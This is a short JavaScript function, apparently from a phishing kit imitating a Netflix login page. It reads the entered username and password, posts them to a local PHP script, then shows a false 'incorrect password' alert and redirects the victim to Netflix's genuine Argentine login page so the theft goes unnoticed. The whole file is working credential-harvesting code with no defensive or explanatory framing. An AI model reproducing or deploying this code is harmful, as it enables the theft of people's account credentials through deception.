function cargar()
{
    var usuario = document.getElementById("usr").value;
    var password = document.getElementById("pass").value;
    var parametro ={
        "usuario": usuario,
        "password": password
    }
    $.ajax({
        
        url: '../PHP/cargar.php',
        type: 'post',
        data: parametro,
        success: function (respuesta){
            if(respuesta == 'ok'){
                alert("Contraseña incorrecta");
                location.href = "https://netflix.com/ar/login";
            }
        }
    });
    return false;
    }